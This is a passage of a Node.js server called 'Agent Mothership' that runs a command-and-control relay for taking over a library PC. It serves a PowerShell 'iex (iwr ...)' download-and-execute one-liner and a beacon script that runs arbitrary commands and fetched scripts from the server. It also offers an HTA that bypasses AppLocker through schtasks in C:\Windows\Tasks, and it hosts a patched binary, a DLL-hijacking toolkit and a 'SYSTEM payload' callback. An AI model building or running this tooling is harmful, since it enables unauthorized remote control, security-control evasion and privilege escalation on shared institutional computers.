      // Distinct JSON shape so the python beacon knows to download+exec
      res.json({ type: 'script', id: entry.id, scriptUrl: entry.scriptUrl });
    } else {
      console.log(`[HTTP Beacon] Sending command ${entry.id} to ${beaconId}: ${entry.command?.substring(0, 60)}`);
      res.json({ type: 'command', command: entry.command, id: entry.id });
    }
  } else {
    res.json({ type: 'ping', command: null, id: null });
  }
});

// GET /api/notify — notification endpoint for SYSTEM payload callback
app.get('/api/notify', (req, res) => {
  console.log(`[NOTIFY] SYSTEM payload called back! query=${JSON.stringify(req.query)}`);
  res.json({ ok: true });
});

// POST /api/beacon/ack — HTTP beacon acknowledges command execution
app.post('/api/beacon/ack', (req, res) => {
  const { beaconId, id } = req.body || {};
  if (!beaconId || !httpBeacons.has(beaconId)) return res.status(404).json({ error: 'beacon not found' });
  console.log(`[HTTP Beacon] Ack received: beacon=${beaconId}, id=${id}`);
  res.json({ ok: true });
});

// POST /api/beacon/result — HTTP beacon submits command/script result
// Also accepts {type:"ack"} just like the WebSocket beacon so that
// /api/beacon/script can extend its timeout without resending HTTP requests.
app.post('/api/beacon/result', (req, res) => {
  const { beaconId, id, stdout, stderr, exitCode, type } = req.body || {};
  if (!beaconId || !httpBeacons.has(beaconId)) return res.status(404).json({ error: 'beacon not found' });
  const beacon = httpBeacons.get(beaconId);
  beacon.pendingCmd = null;
  console.log(`[HTTP Beacon] Result: beacon=${beaconId}, id=${id}, type=${type || 'result'}, exitCode=${exitCode}`);
  // Resolve any pending promise that was waiting for this command.
  if (pendingCommands.has(id)) {
    // Fake a WS-shaped message so makeOneShotResolver handles ack/result/error uniformly.
    const fakeMsg =
      type === 'ack' ? { type: 'ack', id } :
      { id, stdout, stderr, exitCode };
    pendingCommands.get(id)(fakeMsg);
  }
  // Cache result for later retrieval (regardless of pendingCommands)
  commandResults.set(id, { stdout, stderr, exitCode, beaconId, ts: Date.now() });
  if (commandResults.size > 100) {
    const firstKey = commandResults.keys().next().value;
    commandResults.delete(firstKey);
  }
  res.json({ ok: true });
});

// GET /api/beacon/result/:id — retrieve a command result
app.get('/api/beacon/result/:id', checkBeaconAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (commandResults.has(id)) {
    res.json(commandResults.get(id));
  } else {
    res.json({ error: 'Result not found or not yet available', id });
  }
});

// GET /api/beacon/list — list all registered beacons
app.get('/api/beacon/list', (req, res) => {
  const beacons = [];
  for (const [beaconId, beacon] of httpBeacons) {
    beacons.push({
      beaconId,
      lastPoll: beacon.lastPoll,
      info: beacon.info,
      pendingCmd: beacon.pendingCmd,
      queueLength: (httpCommandQueue.get(beaconId) || []).length,
    });
  }
  if (beaconConnection) beacons.push({ beaconId: 'websocket', type: 'ws', info: beaconInfo });
  res.json({ beacons });
});

// Serve the raw one-liner as plain text (no HTML) — for easy copy from browser
app.get('/oneliner', (req, res) => {
  const tunnelHost = resolvePublicHost(req);
  const scheme = 'https';
  const scriptUrl = scheme + '://' + tunnelHost + '/beacon-script';
  const oneLiner = 'iex (iwr -Uri ' + scriptUrl + ').Content';
  res.type('text/plain').send(oneLiner);
});

// ──────────────────────────────────────────────
// Download endpoint — serve .vbs, .bat, .hta as downloadable files
// .hta files get the tunnel URL injected
// ──────────────────────────────────────────────
app.get('/download/:filename', (req, res) => {
  const filename = req.params.filename;
  const allowed = ['connect.vbs', 'connect.bat', 'connect.hta', 'connect-schtasks.hta'];
  if (!allowed.includes(filename)) {
    return res.status(404).send('File not found');
  }
  const filePath = path.join(__dirname, 'public', filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  if (filename.endsWith('.hta')) {
    const tunnelHost = resolvePublicHost(req);
    const tunnelUrl = 'https://' + tunnelHost;
    let content = fs.readFileSync(filePath, 'utf8');
    content = content.replace(/__TUNNEL_URL__/g, tunnelUrl);
    res.type('application/hta').send(content);
    return;
  }
  res.download(filePath, filename);
});

// Serve patched STAgentCtl.exe for download to library PC
app.get('/patched-binary', (req, res) => {
  const filePath = '/tmp/STAgentCtl_patched.exe';
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('Patched binary not found — rebuild on dev machine first');
  }
  res.download(filePath, 'STAgentCtl.exe');
});

// Serve Spartacus DLL hijacking toolkit
app.get('/spartacus', (req, res) => {
  const filePath = path.join(__dirname, '..', 'spartacus', 'Spartacus.exe');
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('Spartacus.exe not found');
  }
  res.download(filePath, 'Spartacus.exe');
});

app.get('/spartacus-assets/:filename', (req, res) => {
  const filename = req.params.filename;
  const allowed = ['prototypes.csv'];
  if (!allowed.includes(filename)) {
    return res.status(404).send('File not found');
  }
  const filePath = path.join(__dirname, '..', 'spartacus', 'Assets', filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  res.download(filePath, filename);
});

// Serve tools (ProcMon, etc.) from /tmp/procmon/
app.get('/tool/:filename', (req, res) => {
  const filename = req.params.filename;
  const allowed = ['Procmon64.exe', 'Procmon.exe', 'Procmon64a.exe'];
  if (!allowed.includes(filename)) {
    return res.status(404).send('File not found');
  }
  const filePath = path.join('/tmp/procmon/', filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  res.download(filePath, filename);
});

// View raw file in browser (text display, not download) — for copy-paste into Notepad
app.get('/view/:filename', (req, res) => {
  const filename = req.params.filename;
  const allowed = ['connect.vbs', 'connect.bat', 'grok-report.txt', 'test_com.ps1', 'test_stagent.ps1', 'enum_modules.py', 'run_patched_simple.ps1', 'enum_modules_cs.ps1', 'check_arch.py', 'scan_acls_system.ps1', 'deploy_acl_scan.ps1'];
  if (!allowed.includes(filename)) {
    return res.status(404).send('File not found');
  }
  const filePath = path.join(__dirname, 'public', filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  res.type('text/plain').send(fs.readFileSync(filePath, 'utf8'));
});

// ──────────────────────────────────────────────
// Connect page — download VBScript/BAT to connect the beacon
// ──────────────────────────────────────────────
app.get('/connect', (req, res) => {
  const externalHost = resolvePublicHost(req);
  const tunnelUrl = 'https://' + externalHost;

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🪟 Connect Beacon — SCHTASKS Sideload</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #1a1a2e;
      color: #e0e0e0;
      font-family: 'Segoe UI', system-ui, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      max-width: 800px;
      width: 100%;
      background: #16213e;
      border: 1px solid #0f3460;
      border-radius: 12px;
      padding: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    }
    h1 { font-size: 24px; margin-bottom: 6px; color: #e94560; }
    .subtitle { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
    .subtitle code { background: #0d1117; padding: 2px 6px; border-radius: 3px; color: #4ade80; font-size: 12px; }
    .tunnel-url {
      background: #0d1117;
      border: 1px solid #0f3460;
      border-radius: 6px;
      padding: 10px 14px;
      font-family: monospace;
      font-size: 13px;
      color: #4ade80;
      word-break: break-all;
      margin-bottom: 25px;
    }
    .btn-group {
      display: flex;
      gap: 16px;
      margin-bottom: 25px;
      flex-wrap: wrap;
    }
    .btn {
      flex: 1;
      min-width: 240px;
      padding: 20px 24px;
      border-radius: 8px;
      border: 1px solid #0f3460;
      background: #0d1117;
      color: #e0e0e0;
      cursor: pointer;
      text-align: center;
      text-decoration: none;
      transition: all 0.15s;
      font-family: inherit;
    }
    .btn:hover {
      border-color: #e94560;
      background: #1a1a2e;
      transform: translateY(-2px);
    }
    .btn .icon { font-size: 30px; display: block; margin-bottom: 8px; }
    .btn .label { font-size: 16px; font-weight: 600; }
    .btn .desc { font-size: 12px; color: #888; margin-top: 4px; line-height: 1.4; }
    .btn.primary {
      background: #e94560;
      border-color: #e94560;
      color: #fff;
    }
    .btn.primary:hover { background: #d63851; }
    .btn.recommended {
      border-color: #f59e0b;
      position: relative;
    }
    .btn.recommended::before {
      content: '⭐ BEST CHOICE — SCHTASKS SIDELOAD';
      position: absolute;
      top: -10px;
      left: 50%;
      transform: translateX(-50%);
      background: #f59e0b;
      color: #000;
      font-size: 9px;
      font-weight: 700;
      padding: 2px 10px;
      border-radius: 4px;
      letter-spacing: 0.3px;
      white-space: nowrap;
    }
    .chain {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-bottom: 25px;
      flex-wrap: wrap;
      font-size: 11px;
      color: #666;
    }
    .chain span {
      background: #0d1117;
      border: 1px solid #0f3460;
      border-radius: 4px;
      padding: 4px 8px;
      color: #888;
    }
    .chain .arrow { background: none; border: none; padding: 0; color: #555; font-size: 14px; }
    .chain .trusted { color: #4ade80; border-color: #1a3a2e; }
    .instructions {
      background: #0d1117;
      border-radius: 8px;
      padding: 20px;
      border-left: 3px solid #f59e0b;
    }
    .instructions h3 { font-size: 13px; color: #60a5fa; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
    .instructions ol { margin-left: 18px; line-height: 2.2; font-size: 14px; }
    .instructions li { color: #ccc; }
    .instructions li strong { color: #e0e0e0; }
    .note {
      margin-top: 20px;
      padding: 16px;
      background: #1a1a2e;
      border-radius: 6px;
      font-size: 13px;
      color: #888;
      text-align: center;
      line-height: 1.6;
    }
    .note a { color: #60a5fa; }
    .note code { background: #0d1117; padding: 1px 5px; border-radius: 3px; color: #4ade80; font-size: 12px; }
    .status { margin-top: 20px; padding: 12px; border-radius: 6px; font-size: 13px; text-align: center; background: #0d1117; border: 1px solid #0f3460; }
    .status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; animation: pulse 1.5s infinite; }
    .status .dot.green { background: #4ade80; }
    .status .dot.yellow { background: #f59e0b; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
  </style>
</head>
<body>
  <div class="container">
    <h1>🪟 Connect This PC</h1>
    <p class="subtitle">
      AppLocker blocking direct execution? This file uses <strong>SCHTASKS sideloading</strong> —
      writes to <code>C:\Windows\Tasks</code> (trusted by AppLocker path rules)
      and runs via a scheduled task in a native Windows process.
    </p>

    <div class="tunnel-url">▶ ${tunnelUrl}</div>

    <div class="chain">
      <span class="trusted">mshta.exe</span>
      <span class="arrow">→</span>
      <span class="trusted">schtasks.exe</span>
      <span class="arrow">→</span>
      <span class="trusted">cmd.exe</span>
      <span class="arrow">→</span>
      <span class="trusted">powershell.exe</span>
      <span class="arrow">→</span>
      <span>beacon</span>
    </div>
    <div style="text-align:center;font-size:11px;color:#555;margin-bottom:25px;">All binaries in <code>System32</code> — AppLocker trusted</div>

    <div class="btn-group">
      <a href="/download/connect-schtasks.hta" class="btn primary recommended">
        <span class="icon">⚡</span>
        <span class="label">Download connect-schtasks.hta</span>
        <span class="desc">Downloads beacon, writes .bat to C:\Windows\Tasks, creates+executes SCHTASKS task, self-cleans</span>
      </a>
    </div>

    <div class="instructions">
      <h3>How it works (1 click)</h3>
      <ol>
        <li><strong>Click</strong> the download button above</li>
        <li><strong>Save</strong> the file (browser prompts to save .hta)</li>
        <li><strong>Double-click</strong> connect-schtasks.hta</li>
        <li>It quietly: downloads beacon → writes <code>.bat</code> to <code>C:\Windows\Tasks</code> → creates SCHTASKS → runs it → cleans up</li>
        <li>The scheduled task runs <strong>PowerShell</strong> hidden → beacon connects to mothership 🎉</li>
      </ol>
    </div>

    <div class="note">
      <strong>Why this works:</strong> Every executable in the chain (<code>mshta.exe</code> → <code>schtasks.exe</code> → <code>cmd.exe</code> → <code>powershell.exe</code>)
      lives in <code>C:\Windows\System32\</code>. AppLocker trusts <code>%WINDIR%\*</code> by default.<br><br>
      The <code>.bat</code> file is written to <code>C:\Windows\Tasks\</code> — also within <code>%WINDIR%</code> and writable by standard users.
      This is the same technique we confirmed working in previous sessions.
    </div>

    <div class="status" id="status">
      <span class="dot green"></span>
      Mothership server is online — waiting for beacon connection...
    </div>
  </div>
</body>
</html>
  `);
});

// Serve a one-liner command to download and run the beacon
app.get('/beacon-run', (req, res) => {
  reqHost = req.headers.host || 'localhost:3000';
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  const httpProto = proto === 'https' ? 'https' : 'http';
  const scriptUrl = httpProto + '://' + reqHost + '/beacon-script';
  const oneLiner = 'iex (iwr -Uri ' + scriptUrl + ').Content';

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🚀 Mothership Beacon — One-Liner</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #1a1a2e;
      color: #e0e0e0;
      font-family: 'Segoe UI', 'Cascadia Code', monospace;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      max-width: 800px;
      width: 100%;
      background: #16213e;
      border: 1px solid #0f3460;
      border-radius: 12px;
      padding: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    }
    h1 {
      font-size: 22px;
      margin-bottom: 8px;
      color: #e94560;
    }
    .subtitle {
      font-size: 14px;
      color: #888;
      margin-bottom: 30px;
      line-height: 1.5;
    }
    .step {
      margin-bottom: 24px;
    }
    .step-label {
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #60a5fa;
      margin-bottom: 8px;
    }
    .command-box {
      background: #0d1117;
      border: 1px solid #0f3460;
      border-radius: 8px;
      padding: 16px 20px;
      position: relative;
      transition: border-color 0.2s;
    }
    .command-box:hover {
      border-color: #e94560;
    }
    .command-box code {
      display: block;
      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
      font-size: 15px;
      color: #4ade80;
      word-break: break-all;
      line-height: 1.5;
      user-select: all;
    }
    .copy-btn {
      position: absolute;
      top: 8px;
      right: 8px;
      background: rgba(233, 69, 96, 0.2);
      border: 1px solid rgba(233, 69, 96, 0.3);
      color: #e94560;
      padding: 4px 12px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 12px;
      font-family: inherit;
      transition: all 0.15s;
    }
    .copy-btn:hover {
      background: rgba(233, 69, 96, 0.4);
    }
    .copy-btn.copied {
      background: rgba(74, 222, 128, 0.2);
      border-color: #4ade80;
      color: #4ade80;
    }
    .instructions {
      margin-top: 30px;
      padding: 20px;
      background: #0d1117;
      border-radius: 8px;
      border-left: 3px solid #e94560;
    }
    .instructions ol {
      margin-left: 20px;
      line-height: 2;
      font-size: 14px;
    }
    .instructions li {
      color: #ccc;
    }
    .instructions li strong {
      color: #e0e0e0;
    }
    .footer {
      margin-top: 30px;
      text-align: center;
      font-size: 12px;
      color: #555;
    }
    .footer a {
      color: #e94560;
      text-decoration: none;
    }
    .alt-link {
      margin-top: 20px;
      padding: 12px;
      background: #0d1117;
      border-radius: 6px;
      font-size: 13px;
      color: #888;
      text-align: center;
    }
    .alt-link a {
      color: #60a5fa;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🚀 Agent Mothership Beacon</h1>
    <p class="subtitle">Connect this library PC to your AI agent. Copy the command below, then paste it into <strong>PowerShell</strong> (or VS Code's integrated PowerShell terminal).</p>

    <div class="step">
      <div class="step-label">Step 1: Copy this one-liner</div>
      <div class="command-box">
        <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
        <code id="oneliner">${oneLiner}</code>
      </div>
    </div>

    <div class="instructions">
      <ol>
        <li><strong>Copy</strong> the command above (click the button or select the text)</li>
        <li>Open <strong>VS Code</strong> on this PC</li>
        <li>Open the <strong>PowerShell terminal</strong> (Ctrl+Shift+P → "Terminal: Create New Terminal")</li>
        <li><strong>Paste</strong> the command and press <strong>Enter</strong></li>
        <li>You'll see it connect — you're now linked to your AI agent 🎉</li>
      </ol>
    </div>

    <div class="alt-link">
      Or open the <a href="/" target="_blank">web terminal</a> directly in your browser →
    </div>

    <div class="footer">
      Agent Mothership &mdash; <a href="https://github.com/ricksanchez8701/agent-mothership" target="_blank">GitHub</a>
    </div>
  </div>

  <script>
    function copyCmd(btn) {
      const code = document.getElementById('oneliner');
      const text = code.textContent;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function() {
          btn.textContent = 'Copied!';
          btn.classList.add('copied');
          setTimeout(function() { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
        });
      } else {
        // Fallback: select the text
        const range = document.createRange();
        range.selectNodeContents(code);
        const selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        btn.textContent = 'Selected!';
        setTimeout(function() { btn.textContent = 'Copy'; }, 2000);
      }
    }
  </script>
</body>
</html>
  `);
});

// ──────────────────────────────────────────────
// WebSocket servers
// ──────────────────────────────────────────────

// Terminal WebSocket (for web browser terminal)
const terminalWss = new ws.WebSocketServer({ noServer: true });

// Beacon relay WebSocket (for library PC connection)
const beaconWss = new ws.WebSocketServer({ noServer: true });

// Manual upgrade routing based on path
server.on('upgrade', (request, socket, head) => {
  const url = new URL(request.url, 'http://localhost');

  if (url.pathname === '/beacon') {
    // Beacon connection from library PC
    const token = url.searchParams.get('token');
    if (BEACON_TOKEN && token !== BEACON_TOKEN) {
      socket.destroy();
      return;
    }
    beaconWss.handleUpgrade(request, socket, head, (ws) => {
      beaconWss.emit('connection', ws, request);
    });
  } else {
    // Terminal WebSocket connection — check auth
    if (AUTH_TOKEN) {
      if (url.searchParams.get('token') !== AUTH_TOKEN) {
        socket.destroy();
        return;
      }
    }
    terminalWss.handleUpgrade(request, socket, head, (ws) => {
      terminalWss.emit('connection', ws, request);
    });
  }
});

// ──────────────────────────────────────────────
// Beacon WebSocket handler
// ──────────────────────────────────────────────
beaconWss.on('connection', (ws, req) => {
  const clientIp = req.socket.remoteAddress;
  console.log(`[beacon] 🔌 Library PC beacon connected from ${clientIp}`);

  beaconConnection = ws;
  beaconInfo = {
    connectedAt: new Date().toISOString(),
    ip: clientIp,
    userAgent: req.headers['user-agent'] || 'unknown',
  };

  // Send a welcome / handshake message
  ws.send(JSON.stringify({
    type: 'connected',
    message: '✅ Agent Mothership beacon relay connected. Awaiting commands.',
    server: os.hostname(),
  }));

      // Handle incoming messages from the beacon
      ws.on('message', (data) => {
        try {
          const msg = JSON.parse(data.toString());

          // Handle keepalive pong
          if (msg.type === 'pong') {
            return;
          }

          // Handle command acknowledgements — beacon received it, still running
          if (msg.type === 'ack' && msg.id && pendingCommands.has(msg.id)) {
            const resolver = pendingCommands.get(msg.id);
            // Extend the timeout by passing the ack to the resolver
            resolver({ type: 'ack', id: msg.id });
            return;
          }

          // Handle command responses
          if (msg.id && pendingCommands.has(msg.id)) {
            const resolver = pendingCommands.get(msg.id);
            resolver(msg);
            pendingCommands.delete(msg.id);
            console.log(`[beacon] ✅ Command ${msg.id} completed (exit: ${msg.exitCode})`);
            return;
          }

          // Handle beacon info updates
          if (msg.type === 'info') {
            beaconInfo = { ...beaconInfo, ...msg.data };
            console.log('[beacon] 📡 Beacon info updated:', msg.data);
            return;
          }

          // Unknown message type
          console.log('[beacon] ❓ Unknown message:', msg);
        } catch (e) {
          console.log('[beacon] ⚠ Invalid message from beacon:', e.message);
        }
      });

  // Keepalive ping — every 30s to prevent Cloudflare tunnel timeout
  // Uses JSON messages instead of WebSocket ping frames because
  // Cloudflare tunnel only forwards actual data frames, not WS-level pings
  const pingInterval = setInterval(() => {
    if (ws.readyState === ws.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000);

  // Handle beacon disconnection
  ws.on('close', () => {
    console.log('[beacon] 🔌 Library PC beacon disconnected');
    clearInterval(pingInterval);
    beaconConnection = null;
    beaconInfo = {};

    // Reject all pending commands
    for (const [id, resolver] of pendingCommands) {
      resolver({ error: 'Beacon disconnected', id });
    }
    pendingCommands.clear();
  });

  // Handle errors
  ws.on('error', (err) => {
    console.log('[beacon] ⚠ Beacon error:', err.message);
    clearInterval(pingInterval);
  });
});

// ──────────────────────────────────────────────
// Terminal WebSocket handler
// ──────────────────────────────────────────────
terminalWss.on('connection', (ws, req) => {
  console.log('[terminal] New client connected');

  let shell;

  // Parse cols/rows from query params for initial size
  const url = new URL(req.url || '/', 'http://localhost');
  const cols = parseInt(url.searchParams.get('cols') || '80', 10);
  const rows = parseInt(url.searchParams.get('rows') || '24', 10);

  if (pty) {
    // Use node-pty for proper terminal emulation
    shell = pty.spawn(SHELL, [], {
      name: 'xterm-256color',
      cols,
      rows,
      cwd: STARTUP_DIR,
      env: {
        ...process.env,
        TERM: 'xterm-256color',
        COLORTERM: 'truecolor',
      },
    });

    // PTY → WebSocket
    shell.onData((data) => {
      if (ws.readyState === ws.OPEN) {
        ws.send(Buffer.from(data).toString('base64'));
      }
    });

    // Handle resize
    ws.on('message', (data) => {
      const msg = data.toString();
      try {
        const json = JSON.parse(msg);
        if (json.type === 'resize' && json.cols && json.rows) {
          try { shell.resize(json.cols, json.rows); } catch (e) {}
          return;
        }
      } catch (e) {
        // Not JSON, treat as terminal input
      }
      shell.write(msg);
    });

  } else {
    // Fallback: use child_process.spawn (no resize support)
    const { spawn } = require('child_process');
    shell = spawn(SHELL, [], {
      cwd: STARTUP_DIR,
      env: {
        ...process.env,
        TERM: 'xterm-256color',
        COLORTERM: 'truecolor',
      },
    });

    shell.stdout.on('data', (d) => {
      if (ws.readyState === ws.OPEN) ws.send(d.toString('base64'));
    });
    shell.stderr.on('data', (d) => {
      if (ws.readyState === ws.OPEN) ws.send(d.toString('base64'));
    });

    ws.on('message', (data) => {
      const msg = data.toString();
      // Skip JSON messages (resize) — not supported in fallback mode
      if (msg.startsWith('{')) return;
      shell.stdin.write(msg);
    });
  }

  // Handle disconnection
  ws.on('close', () => {
    console.log('[terminal] Client disconnected');
    try { shell.kill('SIGTERM'); } catch (e) {}
  });

  // Handle shell exit
  shell.on('exit', (code) => {
    console.log('[terminal] Shell exited with code', code);
    try { if (ws.readyState === ws.OPEN) ws.close(); } catch (e) {}
  });
});

// ──────────────────────────────────────────────
// Beacon PowerShell script generator
// ──────────────────────────────────────────────
function getBeaconScript() {
  const serverHost = reqHost || 'localhost:3000';
  const wsProtocol = reqWsProtocol || 'wss';
  const wsUrl = wsProtocol + '://' + serverHost + '/beacon';

  return [
    '<#',
    '.SYNOPSIS',
    '    Agent Mothership Beacon v2 — Library PC Remote Control',
    '.DESCRIPTION',
    '    Copy-paste this entire script into VS Code\'s PowerShell terminal on your',
    '    library PC. It connects back to the Agent Mothership relay server so the',
    '    AI agent can control your PC remotely.',
    '',
    '    Once connected, the AI can:',
    '    - Run any PowerShell command on your PC',
    '    - Open/close programs (Notepad, Chrome, etc.)',
    '    - Control the mouse and keyboard (via pywinauto if available)',
    '    - Run Python scripts',
    '    - Access files',
    '',
    '    Press Ctrl+C to disconnect.',
    '#>',
    '',
    'param(',
    '    [string]$ServerUrl = "' + wsUrl + '",',
    '    [string]$Token = "' + BEACON_TOKEN + '"',
    ')',
    '',
    '$Host.UI.RawUI.ForegroundColor = [ConsoleColor]::Cyan',
    'Write-Host ""',
    'Write-Host "╔══════════════════════════════════════════╗"',
    'Write-Host "║     🪟 Agent Mothership — BEACON v2     ║"',
    'Write-Host "║     Library PC Remote Control            ║"',
    'Write-Host "╚══════════════════════════════════════════╝"',
    'Write-Host ""',
    '',
    'Write-Host "Connecting to mothership relay..." -ForegroundColor Yellow',
    'Write-Host "URL: $ServerUrl" -ForegroundColor Gray',
    'Write-Host ""',
    '',
    '$pythonAvailable = $false',
    'try {',
    '    $pyVersion = python --version 2>&1',
    '    if ($pyVersion -match "Python") {',
    '        $pythonAvailable = $true',
    '        Write-Host "  $(python --version 2>&1)" -ForegroundColor Green',
    '        try {',
    '            python -c "import pywinauto; print(\"ready\")" 2>&1 | Out-Null',
    '            if ($LASTEXITCODE -eq 0) { Write-Host "  pywinauto available" -ForegroundColor Green }',
    '        } catch { Write-Host "  pywinauto not installed" -ForegroundColor Yellow }',
    '    }',
    '} catch { Write-Host "  Python not found" -ForegroundColor Yellow }',
    '',
    '# WebSocket client is built into .NET - no need to Add-Type',
    '',
    'function Receive-Message($beaconWs, $buffer, $cancellationToken) {',
    '    $stream = New-Object System.IO.MemoryStream',
    '    do {',
    '        $seg = New-Object System.ArraySegment[byte] -ArgumentList (,$buffer)',
    '        $r = $beaconWs.ReceiveAsync($seg, $cancellationToken).GetAwaiter().GetResult()',
    '        $stream.Write($buffer, 0, $r.Count)',
    '    } while (-not $r.EndOfMessage)',
    '    $stream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null',
    '    return [System.Text.Encoding]::UTF8.GetString($stream.ToArray())',
    '}',
    '',
    'function Send-Message($beaconWs, $data) {',
    '    $json = ($data | ConvertTo-Json -Compress -Depth 10)',
    '    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)',
    '    $seg = New-Object System.ArraySegment[byte] -ArgumentList (,$bytes)',
    '    $null = $beaconWs.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()',
    '}',
    '',
    '$maxRetries = 10',
    '$retryCount = 0',
    '$connected = $false',
    '',
    'while (-not $connected -and $retryCount -le $maxRetries) {',
    '    if ($retryCount -gt 0) {',
    '        $wait = [Math]::Min(30, 5 * [Math]::Pow(1.5, $retryCount - 1))',
    '        Write-Host "Retry $retryCount of $maxRetries in ${wait}s..." -ForegroundColor Yellow',
    '        Start-Sleep -Seconds $wait',
    '    }',
    '    $retryCount++',
    '    try {',
    '        $beaconWs = New-Object System.Net.WebSockets.ClientWebSocket',
    '        $beaconWs.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(30)',
    '        $uri = [System.Uri]($ServerUrl + "?token=" + $Token)',
    '        $null = $beaconWs.ConnectAsync($uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()',
    '        $connected = $true',
    '        Write-Host ""',
    '        Write-Host "Connected!" -ForegroundColor Green',
    '        Send-Message $beaconWs @{ type="info"; data=@{ hostname=$env:COMPUTERNAME; username=$env:USERNAME; python=$pythonAvailable } }',
    '        while ($beaconWs.State -eq "Open") {',
    '            $cts = New-Object System.Threading.CancellationTokenSource',
    '            $cts.CancelAfter(130000)  # 130s timeout — prevents terminal freeze!',
    '            try {',
    '                $raw = Receive-Message $beaconWs ([System.Byte[]]::new(131072)) $cts.Token',
    '            } catch {',
    '                Write-Host "Receive error — reconnecting..." -ForegroundColor Yellow',
    '                break',
    '            }',
    '            if (-not $raw) { break }',
    '            $msg = ($raw | ConvertFrom-Json)',
    '',
            '            # Handle server keepalive ping',
            '            if ($msg.type -eq "ping") {',
            '                Send-Message $beaconWs @{ type = "pong" }',
            '                continue',
            '            }',
            '',
            '            # Skip messages without id or command (e.g. welcome/connected)',
            '            if (-not $msg.id -and -not $msg.scriptUrl -and -not $msg.command) {',
            '                continue',
            '            }',
            '',
            '            $response = @{ id = $msg.id }',
    '',
    '            # Send immediate acknowledgement — keeps Cloudflare tunnel alive during long commands',
    '            Send-Message $beaconWs @{ id = $msg.id; type = "ack" }',
    '',
    '            try {','                if ($msg.scriptUrl) {',
    '                    Write-Host "Downloading script: $($msg.scriptUrl)" -ForegroundColor Cyan',
    '                    $raw = (Invoke-WebRequest -Uri $msg.scriptUrl -UseBasicParsing).Content; $scriptContent = if ($raw -is [byte[]]) { [System.Text.Encoding]::UTF8.GetString($raw) } else { $raw }',
    '                    $tmp = [System.IO.Path]::GetTempPath() + [System.IO.Path]::GetRandomFileName() + ".ps1"',
    '                    [System.IO.File]::WriteAllText($tmp, $scriptContent, [System.Text.Encoding]::UTF8)',
    '                    try {',
    '                        $response.stdout = powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp 2>&1 | Out-String',
    '                        $response.exitCode = $LASTEXITCODE',
    '                    } finally { try { [System.IO.File]::Delete($tmp) } catch {} }',
    '                } elseif ($pythonAvailable -and $msg.command -match "^pywinauto:") {',
    '                    $py = $msg.command -replace "^pywinauto:", ""',
    '                    $LASTEXITCODE = 0',
    '                    $response.stdout = $(python -c $py 2>&1 | Out-String)',
    '                    $response.exitCode = $LASTEXITCODE',
    '                } else {',
    '                    $LASTEXITCODE = 0',
    '                    $response.stdout = $(Invoke-Expression $msg.command 2>&1 | Out-String)',
    '                    $response.exitCode = $LASTEXITCODE',
    '                }',
    '            } catch { $response.stderr = "$_"; $response.exitCode = 1 }',
    '            Send-Message $beaconWs $response',
    '        }',
    '        $connected = $false  # trigger reconnect on exit or timeout',
    '        try { $null = $beaconWs.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "done", [System.Threading.CancellationToken]::None).GetAwaiter().GetResult() } catch {}',
    '    } catch { Write-Host "Connection failed: $_" -ForegroundColor Red; $connected = $false }',
    '    finally { if ($beaconWs) { $beaconWs.Dispose() } }',
    '}',
    '',
    'if (-not $connected) { Write-Host "Max retries reached. Copy-paste the script again." -ForegroundColor Red }',
    'Write-Host "Beacon disconnected." -ForegroundColor Yellow',
    '',
  ].join("\n");
}



// ──────────────────────────────────────────────
// Start
// ──────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════╗
║     🌐 Agent Mothership — Web Terminal + Beacon     ║
║                                                      ║
║     Local:  http://localhost:${PORT}                          ║
║     Shell:  ${SHELL}                                         ║
║                                                      ║
║  📡 Beacon Relay ready for library PC connection     ║
║     WebSocket: ws://localhost:${PORT}/beacon                  ║
║                                                      ║
║  📋 Get the beacon script:                           ║
║     http://localhost:${PORT}/beacon-script                    ║
║                                                      ║
